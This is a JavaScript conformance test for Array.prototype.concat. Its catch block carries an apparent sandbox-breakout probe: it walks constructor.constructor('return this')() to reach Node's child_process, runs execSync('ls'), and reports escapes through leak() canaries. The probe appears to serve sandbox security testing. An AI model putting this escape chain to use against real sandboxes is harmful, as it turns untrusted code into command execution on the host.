try {
    var x = [0];
    var y = new Object();
    var z = new Array(1, 2);
    var arr = x.concat(y, z, -1, true, 'NaN');
    arr.getClass = Object.prototype.toString;
    if (arr.getClass() !== '[object ' + 'Array' + ']') {
        $ERROR('#0: var x = [0]; var y = new Object(); var z = new Array(1,2); var arr = x.concat(y,z, -1, true, "NaN"); arr is Array object. Actual: ' + arr.getClass());
    }
    if (arr[0] !== 0) {
        $ERROR('#1: var x = [0]; var y = new Object(); var z = new Array(1,2); var arr = x.concat(y,z, -1, true, "NaN"); arr[0] === 0. Actual: ' + arr[0]);
    }
    if (arr[1] !== y) {
        $ERROR('#2: var x = [0]; var y = new Object(); var z = new Array(1,2); var arr = x.concat(y,z, -1, true, "NaN"); arr[1] === y. Actual: ' + arr[1]);
    }
    if (arr[2] !== 1) {
        $ERROR('#3: var x = [0]; var y = new Object(); var z = new Array(1,2); var arr = x.concat(y,z, -1, true, "NaN"); arr[2] === 1. Actual: ' + arr[2]);
    }
    if (arr[3] !== 2) {
        $ERROR('#4: var x = [0]; var y = new Object(); var z = new Array(1,2); var arr = x.concat(y,z, -1, true, "NaN"); arr[3] === 2. Actual: ' + arr[3]);
    }
    if (arr[4] !== -1) {
        $ERROR('#5: var x = [0]; var y = new Object(); var z = new Array(1,2); var arr = x.concat(y,z, -1, true, "NaN"); arr[4] === -1. Actual: ' + arr[4]);
    }
    if (arr[5] !== true) {
        $ERROR('#6: var x = [0]; var y = new Object(); var z = new Array(1,2); var arr = x.concat(y,z, -1, true, "NaN"); arr[5] === true. Actual: ' + arr[5]);
    }
    if (arr[6] !== 'NaN') {
        $ERROR('#7: var x = [0]; var y = new Object(); var z = new Array(1,2); var arr = x.concat(y,z, -1, true, "NaN"); arr[6] === "NaN". Actual: ' + arr[6]);
    }
    if (arr.length !== 7) {
        $ERROR('#8: var x = [0]; var y = new Object(); var z = new Array(1,2); var arr = x.concat(y,z, -1, true, "NaN"); arr.length === 7. Actual: ' + arr.length);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}